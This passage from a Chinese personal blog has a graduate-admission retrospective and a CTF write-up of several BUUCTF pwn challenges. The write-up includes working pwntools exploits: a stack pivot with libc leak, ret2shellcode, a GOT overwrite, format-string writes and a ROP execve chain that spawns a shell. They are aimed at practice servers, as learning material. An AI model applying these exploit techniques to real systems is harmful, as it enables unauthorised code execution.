<h3 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;glibc-2.23&#x2F;lib&#x2F;libc-2.23.so</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;glibc-2.23&#x2F;lib&#x2F;ld-2.23.so</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>2021推免总结</title>
    <url>/2021/10/14/22-17/</url>
    <content><![CDATA[<p>2021年推免结束了，最终去了国防科技大学 气象海洋学院，忙里偷闲，记录一下自己的一些感受。</p>
<p><img src="/2021/10/14/22-17/image-20211014221958513.png" alt="image-20211014221958513"></p>
<h3 id="个人情况"><a href="#个人情况" class="headerlink" title="个人情况"></a>个人情况</h3><p>本科双非，坐标长春理工大学</p>
<p>成绩：2/254，前1%</p>
<p>英语：四六级通过（六级飘过）</p>
<p>比赛：网安选手，一两个国赛、n个省赛、n个校赛</p>
<p>项目：一个导师的在研项目</p>
<h3 id="夏令营"><a href="#夏令营" class="headerlink" title="夏令营"></a>夏令营</h3><blockquote>
<p>特别后悔开始投了很多学硕，双非孩子不要想了，全投专硕！！</p>
<p>一定要从夏令营开始重视，不要想着开始先玩一玩，你永远不知道每年的保研形势是什么样子！！</p>
<p>双非本来就非常不占优势了，一定要做好每一步，你才有机会！！</p>
</blockquote>
<p>投递了很多学校，但是效果甚微，一方面文书没有准备好，一方面投递学硕策略不正确。</p>
<hr>
<p>入营：山东大学、西北工业大学、吉林大学、东南网安（无锡）、浙大软院（报名就给）、国防科大 气象海洋</p>
<p>offer：吉林大学、国防科大 气象海洋</p>
<hr>
<p>emmm、山大和西工大因为地理不喜欢，也没有好好准备，没有拿到offer</p>
<p>吉林大学可能因为地理原因，基本都给了offer</p>
<p>东南今年初审直接分配了无锡，直接无了</p>
<p>浙大软院因为在宁波，和三本学校共用校区也无了</p>
<p>国防科大其实偶然机会报名了，但是比较幸运进去了，也是最终去向。</p>
<blockquote>
<p>这里还打了信安国赛，参加了哈工大的暑期学校，挺好的，哈哈哈</p>
</blockquote>
<h3 id="预推免"><a href="#预推免" class="headerlink" title="预推免"></a>预推免</h3><p>预推免并没有比夏令营简单，哭哭，</p>
<p>这时候简历什么的文书已经相对完善了，但是机会不多了</p>
<hr>
<p>入营：西工大（我又来啦）、电科-深圳、华南理工大学</p>
<p>offer：西工大、电科深、华工</p>
<hr>
<p>差不多入营了都拿到offer了，感觉夏令营和预推免难度差不多，，，电科和华工投的都是专硕</p>
<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="/2021/10/14/22-17/image-20211014224904410.png" alt="image-20211014224904410"></p>
<ol>
<li>电科</li>
</ol>
<p>其实电科深的研究发现我很喜欢，导师是二进制的，太难得了，但是导师没回过我，而且电科深据说都放羊，就放弃了</p>
<p>电科发消息很快，感受很好，我和朋友都很快收到了录取通知</p>
<ol>
<li>华工</li>
</ol>
<p>简历都是网安，问的我全是计算机，网安哭哭，但是还是过了，</p>
<p>感觉被养🐟，和同学差了一分多，他很早收到通知了，我一直没收到，，，</p>
<ol>
<li>西工大</li>
</ol>
<p>方向不感兴趣，地理也不好，当然不会去了</p>
<ol>
<li>国防科大</li>
</ol>
<p>其实电科和华工没出来之前，难受了很久，难道自己就只能去西工大或者吉大了么（因为非常想回南方）。</p>
<p>然后电科深和华工出来后很开心，不过因为和国防科大老师说好了后，就决定去那里了。</p>
<blockquote>
<p>国防科大，我是没有想到的，军校，曾经自己也有一段军旅梦呀，未来好好加油！</p>
</blockquote>
<p>我的推免，满意也算满意，不满意也有些不满意，但总的来说，还是不错的。</p>
<p>如果从来一次，自己肯定能做的更好，冲个华5 网安呀，梦校</p>
<p>但是国防科大一方面学校title挺好的，导师也很好，push型是我爱的，学校补贴，小组氛围也很好，唯一遗憾的是专业变成大气科学了，有机会读个博士变回来哈哈哈哈~</p>
<h3 id="勉励"><a href="#勉励" class="headerlink" title="勉励"></a>勉励</h3><p>唉，双非学校不太看重科研论文，竞赛权重更重要。</p>
<p>如果认准了保研，首先绩点必须稳、最好rank1；其次，英语四六级550+，保研的时候，你会发现大家都500+的，，，；然后，最好参加ACM竞赛，拿几个国家级、省级的竞赛；最后，大二左右跟随学校某实验室老师准备科研/有钱可以考虑花钱跟机构做（产出保证）。高质量论文多多益善（1-2篇）、其他的项目（最好是国家级大创），再来几个就行了。</p>
<p>感觉，能做到这几点，出来无敌了。</p>
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>推免</tag>
      </tags>
  </entry>
  <entry>
    <title>buu每日一题（3）</title>
    <url>/2021/03/29/22-03/</url>
    <content><![CDATA[<h2 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h2><blockquote>
<p>单独写了篇文章，方法是fastbin attack</p>
</blockquote>
<ul>
<li><a href="https://warm-winter.github.io/2021/04/19/0ctf-2017-babyheap/" target="_blank" rel="noopener">0ctf_2017_babyheap详解</a></li>
</ul>
<h2 id="wustctf2020-closed"><a href="#wustctf2020-closed" class="headerlink" title="wustctf2020_closed"></a>wustctf2020_closed</h2><h3 id="常用文件描述符"><a href="#常用文件描述符" class="headerlink" title="常用文件描述符"></a>常用文件描述符</h3><ul>
<li>stdin：0</li>
<li>stdout：1</li>
<li>stderr：2</li>
</ul>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
<p>关闭了输出流和错误流，然后直接给了shell，但是没有输出。</p>
</blockquote>
<p><img src="/2021/03/29/22-03/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210430210044168.png" alt="image-20210430210044168"></p>
<p>方法：</p>
<h3 id="stdout重定向"><a href="#stdout重定向" class="headerlink" title="stdout重定向"></a>stdout重定向</h3><p>简单来说，既然stdout的文件描述符不可用，可以对stdout重定向，将文件描述符 stdout（1）重定向到可用文件描述符 stdin（0）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec 1&gt;&amp;0</span><br></pre></td></tr></table></figure>
<h2 id="actf-2019-babystack"><a href="#actf-2019-babystack" class="headerlink" title="actf_2019_babystack"></a>actf_2019_babystack</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec ACTF_2019_babystack</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;ACTF_2019_babystack&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h2 id="actf-2019-babystack-1"><a href="#actf-2019-babystack-1" class="headerlink" title="actf_2019_babystack"></a>actf_2019_babystack</h2><blockquote>
<p><del>吐了，，，思路一样，不对</del></p>
</blockquote>
<h3 id="程序流程-1"><a href="#程序流程-1" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
<p>最多可以输入0xe0个字节，但是s在rbp-0xd0。</p>
<p>故最多可以溢出rbp和返回地址，所以需要栈迁移。</p>
<p>程序给了栈地址，直接在栈上布置即可。</p>
<ul>
<li><p>rbp：fake stack</p>
</li>
<li><p>ret：leave_ret</p>
</li>
</ul>
</blockquote>
<p><img src="/2021/03/29/22-03/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210501162717088.png" alt="image-20210501162717088"></p>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><blockquote>
<p>自己不知道哪里错了，，，直接用师傅的<a href="https://www.cnblogs.com/luoleqi/p/13409781.html" target="_blank" rel="noopener">exp</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"> </span><br><span class="line">io = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29408</span>)</span><br><span class="line"><span class="comment">#io = process('./ACTF_2019_babystack')</span></span><br><span class="line"><span class="comment">#io = process('./idaidg/linux_server64')</span></span><br><span class="line">elf = ELF(<span class="string">'./ACTF_2019_babystack'</span>)</span><br><span class="line"> </span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"> </span><br><span class="line">pop_rdi = <span class="number">0x400ad3</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>] </span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">start = <span class="number">0x4008f6</span></span><br><span class="line">leave = <span class="number">0x400a18</span></span><br><span class="line">ret = <span class="number">0x400a4f</span></span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">"How many bytes of your message?"</span>)</span><br><span class="line">io.sendline(<span class="string">'224'</span>)</span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">"Your message will be saved at "</span>)</span><br><span class="line">addr = io.recv()[:<span class="number">14</span>]</span><br><span class="line">addr = int(addr,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'a'</span>* <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(start)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>,<span class="string">'a'</span>)</span><br><span class="line">payload += p64(addr)</span><br><span class="line">payload += p64(leave)</span><br><span class="line"> </span><br><span class="line">io.send(payload)</span><br><span class="line">puts_addr = io.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]</span><br><span class="line">puts_addr = puts_addr.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(u64(puts_addr))</span><br><span class="line">libcbase = u64(puts_addr) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libcbase + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">"How many bytes of your message?"</span>)</span><br><span class="line">io.sendline(<span class="string">'224'</span>)</span><br><span class="line">io.recvuntil(<span class="string">"Your message will be saved at "</span>)</span><br><span class="line">addr = io.recv()[:<span class="number">14</span>]</span><br><span class="line">addr = int(addr,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'a'</span>* <span class="number">8</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>,<span class="string">'a'</span>)</span><br><span class="line">payload += p64(addr)</span><br><span class="line">payload += p64(leave)</span><br><span class="line"> </span><br><span class="line">io.sendline(payload)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="picoctf-2018-shellcode"><a href="#picoctf-2018-shellcode" class="headerlink" title="picoctf_2018_shellcode"></a>picoctf_2018_shellcode</h2><blockquote>
<p>最简单的ret2shellcode题，把shellcode发过去就行。。。</p>
</blockquote>
<h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><p>唯一的难点应该在于main函数不能反汇编，得看汇编。</p>
<p><img src="/2021/03/29/22-03/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210501164740595.png" alt="image-20210501164740595"></p>
<p><img src="/2021/03/29/22-03/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210501164752604.png" alt="image-20210501164752604"></p>
<p>vuln函数就是输入再打印。</p>
<p>所以，程序流程就是输入数据，并且会直接改数据。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29061</span>)</span><br><span class="line">elf = ELF(<span class="string">'./PicoCTF_2018_shellcode'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">io.sendline(payload)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="picoctf-2018-got-shell"><a href="#picoctf-2018-got-shell" class="headerlink" title="picoctf_2018_got_shell"></a>picoctf_2018_got_shell</h2><h3 id="程序流程-2"><a href="#程序流程-2" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
<p>能给任意地址写入四个字节数据，32位。</p>
<p>而且给了后门函数，直接修改puts的got表位win的地址即可。</p>
<p>注意一点：发送数据应该发送的是整数，也就是hex()，而不是p32()，它是字符。</p>
</blockquote>
<p><img src="/2021/03/29/22-03/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210419145953699.png" alt="image-20210419145953699"></p>
<p><img src="/2021/03/29/22-03/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210419150030225.png" alt="image-20210419150030225"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./PicoCTF_2018_got-shell"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25946</span>)</span><br><span class="line">elf = ELF(<span class="string">"./PicoCTF_2018_got-shell"</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">win = elf.symbols[<span class="string">'win'</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"value?"</span>)</span><br><span class="line">p.sendline(hex(puts_got))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"like"</span>)</span><br><span class="line">p.sendline(hex(win))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="mrctf2020-easy-equation"><a href="#mrctf2020-easy-equation" class="headerlink" title="mrctf2020_easy_equation"></a>mrctf2020_easy_equation</h2><blockquote>
<p>一道格式化字符串，，，，不知道为什么用pwntools工具不好使，，，</p>
</blockquote>
<h3 id="程序流程-3"><a href="#程序流程-3" class="headerlink" title="程序流程"></a>程序流程</h3><p><img src="/2021/03/29/22-03/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210501231211604.png" alt="image-20210501231211604"></p>
<p>输入字符串，格式化字符串</p>
<p>一个判断，满足判断即可获得shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> judge <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">	<span class="keyword">if</span>( <span class="number">11</span> * judge * judge + <span class="number">17</span> * judge * judge * judge * judge - <span class="number">13</span> * judge * judge * judge - <span class="number">7</span> * judge == <span class="number">198</span>):</span><br><span class="line">		<span class="keyword">print</span> judge</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ python equation.py </span><br><span class="line">2</span><br></pre></td></tr></table></figure>
<p>故只要judge为2即可。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用格式化字符串将judge的值变为2即可。</p>
<p>方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;bb%9$naaa&quot;+p64(judge)</span><br></pre></td></tr></table></figure>
<h4 id="8不是9"><a href="#8不是9" class="headerlink" title="8不是9"></a>8不是9</h4><p>8</p>
<blockquote>
<p>只发送了0xf个字节，到1的时候就没了，，，后门的并没有发送过去。。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;bb%8$n&quot;+p64(judge)	&#x3D;&gt;	将%8$n之前的字节数，也就是2，写入到offse&#x3D;8的位置，也就是%8$n后面的judge</span><br><span class="line"></span><br><span class="line">[DEBUG] Sent 0xf bytes:</span><br><span class="line">    00000000  62 62 25 38  24 6e 5c 10  60 00 00 00  00 00 0a     │bb%8│$n\·│&#96;···│···│</span><br><span class="line">    0000000f</span><br></pre></td></tr></table></figure>
<p>9</p>
<blockquote>
<p>发送了12个字节，都发送过去了。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;bb%9$naaa&quot;+p64(judge)	&#x3D;&gt;	将%9$n之前的字节数，也就是2，写入到offse&#x3D;9的位置，因为偏移为8，而judge前面刚好9个字节，一开始就少一个，所以offset&#x3D;9的位置刚好在前面九个字符之后。</span><br><span class="line"></span><br><span class="line">[DEBUG] Sent 0x12 bytes:</span><br><span class="line">    00000000  62 62 25 39  24 6e 61 61  61 5c 10 60  00 00 00 00  │bb%9│$naa│a\·&#96;│····│</span><br><span class="line">    00000010  00 0a</span><br></pre></td></tr></table></figure>
<p>emmm，字节对齐？</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># for judge in range(200):</span></span><br><span class="line"><span class="comment"># 	if( 11 * judge * judge + 17 * judge * judge * judge * judge - 13 * judge * judge * judge - 7 * judge == 198):</span></span><br><span class="line"><span class="comment"># 		print judge</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./wdb_2018_2nd_easyfmt")</span></span><br><span class="line">p=process(<span class="string">"./mrctf2020_easy_equation"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28245</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">judge = <span class="number">0x60105C</span></span><br><span class="line">offset = <span class="number">7</span></span><br><span class="line"><span class="comment"># payload = fmtstr_payload(offset,&#123;judge:2&#125;)</span></span><br><span class="line">payload = <span class="string">"bb%9$naaa"</span>+p64(judge)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="picoctf-2018-can-you-gets-me"><a href="#picoctf-2018-can-you-gets-me" class="headerlink" title="picoctf_2018_can_you_gets_me"></a>picoctf_2018_can_you_gets_me</h2><blockquote>
<p>静态文件，用ropchain就行，类似于<a href="https://blog.csdn.net/qq_43935969/article/details/104444648?spm=1001.2014.3001.5501" target="_blank" rel="noopener">这道题</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ file PicoCTF_2018_can-you-gets-me </span><br><span class="line">PicoCTF_2018_can-you-gets-me: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU&#x2F;Linux), statically linked, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;4141b1e04d2e7f1623a4b8923f0f87779c0827ee, not stripped</span><br><span class="line"></span><br><span class="line">winter@ubuntu:~&#x2F;buu$ checksec PicoCTF_2018_can-you-gets-me</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;PicoCTF_2018_can-you-gets-me&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/29/22-03/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506151027760.png" alt="image-20210506151027760"></p>
<p>栈溢出，18个字节</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary PicoCTF_2018_can-you-gets-me --ropchain</span><br></pre></td></tr></table></figure>
<h3 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># execve generated by ROPgadget</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process("./PicoCTF_2018_can-you-gets-me")</span></span><br><span class="line">io = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26005</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080de955</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806cc25</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x18</span> + <span class="number">4</span>)+p</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy_echo"></a>inndy_echo</h2><blockquote>
<p>格式化字符串</p>
</blockquote>
<h3 id="程序流程-4"><a href="#程序流程-4" class="headerlink" title="程序流程"></a>程序流程</h3><blockquote>
<p>有一个循环，格式化字符串漏洞，多次利用</p>
<p>程序中调用了system函数</p>
</blockquote>
<p><img src="/2021/03/29/22-03/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506152600364.png" alt="image-20210506152600364"></p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
<li>利用格式化字符串修改printf的got为system函数的plt表</li>
<li>发送‘/bin/sh’即可。</li>
</ol>
<h3 id="完整exp-2"><a href="#完整exp-2" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./echo"</span>)</span><br><span class="line"><span class="comment"># p=process(['./wdb_2018_2nd_easyfmt'],env=&#123;"LD_PRELOAD":"/home/winter/buu/libc-2.23-32.so"&#125;)</span></span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26073</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">elf = ELF(<span class="string">"./echo"</span>)</span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">'printf'</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">'system'</span>]</span><br><span class="line">system_got = elf.got[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">offset = <span class="number">7</span></span><br><span class="line">payload = fmtstr_payload(offset,&#123;printf_got:system_plt&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="suctf-2018-basic-pwn"><a href="#suctf-2018-basic-pwn" class="headerlink" title="suctf_2018_basic pwn"></a>suctf_2018_basic pwn</h2><blockquote>
<p>最简单的栈溢出</p>
</blockquote>
<p>偏移量为0x110</p>
<p><img src="/2021/03/29/22-03/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506154310332.png" alt="image-20210506154310332"></p>
<h3 id="后门函数：-bin-cat"><a href="#后门函数：-bin-cat" class="headerlink" title="后门函数：/bin/cat"></a>后门函数：/bin/cat</h3><p>执行该函数能直接打印flag</p>
<p><img src="/2021/03/29/22-03/Users\YCNN\AppData\Roaming\Typora\typora-user-images\image-20210506154404324.png" alt="image-20210506154404324"></p>
<h3 id="完整exp-3"><a href="#完整exp-3" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">io = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29307</span>)</span><br><span class="line">elf = ELF(<span class="string">'./SUCTF_2018_basic_pwn'</span>)</span><br><span class="line"><span class="comment"># io = process("./SUCTF_2018_basic_pwn")</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">door = <span class="number">0x0000401157</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x110</span>+<span class="number">8</span>)+p64(door)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
